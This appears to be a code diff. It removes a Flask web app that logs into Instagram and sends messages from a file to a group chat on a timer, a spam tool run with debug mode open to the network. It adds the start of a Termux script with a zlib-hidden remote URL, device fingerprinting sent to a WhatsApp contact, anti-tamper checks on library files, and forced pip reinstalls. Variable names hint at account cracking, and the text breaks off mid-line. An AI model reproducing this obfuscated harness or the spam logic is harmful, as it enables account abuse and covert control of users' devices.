@@ -1,154 +1,145 @@
-from flask import Flask, request, render_template_string, redirect, url_for, flash
-from instagrapi import Client
+#Open Source By Awais Soomro
+from requests import api
+from urllib3 import connection
+from urllib import request
+from requests import sessions
+from requests import models
+from requests import utils
+from requests import adapters
+from requests import cookies
+from requests import compat
+from requests import hooks
+from requests import exceptions
+from requests import certs
+from requests import structures
+from requests import auth
+from requests import packages
+from time import sleep as sp
 import os
-import time
+try:
+    import requests
+except ModuleNotFoundError:
+    os.system(f'pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
+import random,time,sys,requests,uuid,json,base64,re,zlib,shutil,platform,subprocess,tempfile,string
+from concurrent.futures import ThreadPoolExecutor as loda
+from bs4 import BeautifulSoup
+###----------[ CHECK THEME COLOR ]---------- ###
+try:
+	color_table = "#00FF00"
+except FileNotFoundError:
+	color_table = "#00FF00"
+#--(Dark@Colours)---#
+r="\033[1;91m"
+g="\033[1;92m"
+y="\033[1;93m"
+b="\033[1;94m"
+p="\033[1;95m"
+c="\033[1;96m"
+l="\033[1;97m"
+s="\033[0m"
+#--(light@Colours)---#
+lr="\033[0;91m"
+lg="\033[0;92m"
+ly="\033[0;93m"
+lb="\033[0;94m"
+lp="\033[0;95m"
+lc="\033[0;96m"
+ll="\033[38;5;208m"
+#--(rare-colors)--#
+holaa="38;5"
+ro=(f"\033[{holaa};208")
+rb=(f"\033[{holaa};32")
+rc=(f"\033[{holaa};122m")
+rg= (f"\033[{holaa};112m")
+rp=(f"\033[{holaa};147m") 
+oks = []
+cps = []
+plist = []
+methods = []
+speed = []
+twf = []
+loop = 0
+pcp = []
+cok = []
 
-# Initialize Flask app
-app = Flask(__name__)
-app.secret_key = "your_secret_key"
+logo = """
+\033[1;92m         ###    ##     ## #### 
+\033[1;37m        ## ##    ##   ##   ##  
+ \033[1;37m      ##   ##    ## ##    ##  
+\033[1;92m      ##     ##    ###     ##  
+\033[1;37m      #########   ## ##    ##  
+\033[1;97m      ##     ##  ##   ##   ##  
+\033[1;92m      ##     ## ##     ## #### 
+\033[1;37m----------------------------------------------
+  [+] Owner    :   KHALFAN-XD
+  [+] Github   :   AXI-403
+  [+] Status   :   PRIVATE 
+\033[1;37m----------------------------------------------"""
+def linex():
+    print('\033[1;37m----------------------------------------------')
+xny = zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7O\xac\xc8L\xcc\xc8ML17714\xd2K\xca\xc9O/.\xc8/\xd1K\xce\xcf\xd57202\xd274\xd2\xcf\xadL,(\xd3\xcb(\xc9\xcd\xb1\xcf\xb55\x04\x002\xc1\x12\xf3')
+update = requests.get(xny).text
+uuidd = str(os.geteuid()) + str(os.getlogin()) + str(os.getuid())
+id = "".join(uuidd).replace("_","").replace("360","AHS").replace("u","9").replace("a","A")
+plat = platform.version()[14:][:21][::-1].upper()+platform.release()[5:][::-1].upper()+platform.version()[:8]
+xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')
+bxd = ""
+bumper = id+bxd+xp
+myweb2 = requests.get(xny).text
 
-# Global variable for Instagram client session
-ig_client = None
+def ajbuy():
+		try:
+				os.system('clear') 
+				print(logo);xchker();verify_changer();verify_changer2();verify_changer3();verify_changer4();xchker();verify_changer();verify_changer2();verify_changer3()
+				x = requests.get('https://raw.githubusercontent.com/libraries/main/version.txt').text
+				if str("upppdate") in update:
+						os.system('clear')
+						exit('script is in update / maintanance be patient ')
+				elif str("res-sseett") in update:
+						os.system('')
+						os.system('')
+						os.system('')
+						exit('Dont Try To Bypass')
+				elif bumper in myweb2:
+						menu()
+				else:
+						os.system("clear");print(logo);xchker();verify_changer();verify_changer2();verify_changer3();verify_changer4();xchker();verify_changer();verify_changer2();verify_changer3()
+						print(f"{lr}   Your Device License Key Is Not Approved{s}")
+						print(50*"-")
+						print(f"{rc} Key : {bumper}{s}")
+						print(50*"-")
+						
+						print(50*"-")
+						print(f" Free Lakin Approval Laina Ho Ga")
+						
+						print(50*"-")
+						input("[Press Enter To Send Key To Admin]")
+						os.system(f"termux-open-url https://wa.me/+923152919072?text={bumper}")
+						ajbuy()
+		except requests.exceptions.ConnectionError:
+				exit(' No internet connection ..')
 
-# HTML Template with shadow border and background wallpaper
-HTML_TEMPLATE = '''
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram Group Messaging</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            background: url('https://i.ibb.co/fFqG2rr/Picsart-24-07-11-17-16-03-306.jpg') no-repeat center center;
-            background-size: cover;
-        }
-        .container {
-            background-color: rgba(255, 255, 255, 0.9);
-            padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
-            max-width: 400px;
-            width: 100%;
-        }
-        h1 {
-            text-align: center;
-            color: #333;
-            margin-bottom: 20px;
-        }
-        label {
-            display: block;
-            font-weight: bold;
-            margin: 10px 0 5px;
-        }
-        input, select, button {
-            width: 100%;
-            padding: 10px;
-            margin-bottom: 15px;
-            border: 1px solid #ccc;
-            border-radius: 5px;
-            font-size: 16px;
-        }
-        input:focus, select:focus, button:focus {
-            outline: none;
-            border-color: #007bff;
-            box-shadow: 0 0 5px rgba(0, 123, 255, 0.5);
-        }
-        button {
-            background-color: #007bff;
-            color: white;
-            border: none;
-            cursor: pointer;
-            font-weight: bold;
-        }
-        button:hover {
-            background-color: #0056b3;
-        }
-        .message {
-            color: red;
-            font-size: 14px;
-            text-align: center;
-        }
-        .success {
-            color: green;
-            font-size: 14px;
-            text-align: center;
-        }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <h1>Instagram Group Messaging</h1>
-        <form action="/" method="POST" enctype="multipart/form-data">
-            <label for="username">Instagram Username:</label>
-            <input type="text" id="username" name="username" placeholder="Enter your username" required>
+def rrrr():
+		if bumper in myweb2:
+				pass
+		else:
+				ajbuy()
+def xchker():
+	pass
+	
+def verify_changer3():
+	with open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/sessions.py', 'r') as file :
+			filedata63 = file.read()
+	if "verify = False" in filedata63:
+			print("Bhai method Capture Krny Ki Kosis Kr rha Tah Ab Data Ko Pakar pehly ðŸ˜‚ðŸ˜‚")
+			exit("Your Device Is Reseted Dont Try To Bypass Anymore")
+	else:
+			pass
 
-            <label for="password">Instagram Password:</label>
-            <input type="password" id="password" name="password" placeholder="Enter your password" required>
-
-            <label for="group_id">Group Chat ID:</label>
-            <input type="text" id="group_id" name="group_id" placeholder="Enter group chat ID" required>
-
-            <label for="message_file">Message File:</label>
-            <input type="file" id="message_file" name="message_file" required>
-            <p class="info">Upload a text file containing messages, one per line.</p>
-
-            <label for="delay">Delay (seconds):</label>
-            <input type="number" id="delay" name="delay" placeholder="Enter delay in seconds" required>
-
-            <button type="submit">Send Messages</button>
-        </form>
-    </div>
-</body>
-</html>
-'''
-
-@app.route("/", methods=["GET", "POST"])
-def home():
-    global ig_client
-
-    if request.method == "POST":
-        try:
-            # Collect form data
-            username = request.form["username"]
-            password = request.form["password"]
-            group_id = request.form["group_id"]
-            delay = int(request.form["delay"])
-            message_file = request.files["message_file"]
-
-            # Read messages from file
-            messages = message_file.read().decode("utf-8").splitlines()
-            if not messages:
-                flash("Message file is empty!", "error")
-                return redirect(url_for("home"))
-
-            # Login to Instagram
-            if not ig_client:
-                ig_client = Client()
-                ig_client.login(username, password)
-                flash("Logged in successfully!", "success")
-
-            # Send messages to group
-            for message in messages:
-                print(f"Sending message to group {group_id}: {message}")
-                ig_client.direct_send(message, thread_ids=[group_id])
-                time.sleep(delay)  # Delay between messages
-
-            flash("All messages sent successfully!", "success")
-        except Exception as e:
-            flash(f"An error occurred: {e}", "error")
-
-        return redirect(url_for("home"))
-
-    return render_template_string(HTML_TEMPLATE)
-
-if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=5000, debug=True)
-          
+	with open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/sessions.py', 'r') as file7 :
+			filedata3 = file7.read()
+	with open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/api.py', 'r') as file77 :
+			filedata4 = file77.read()
+	if bumper in filedata4:
+			exit("Dont try bypass to add my keys in content or etc ")
+	elif bumper
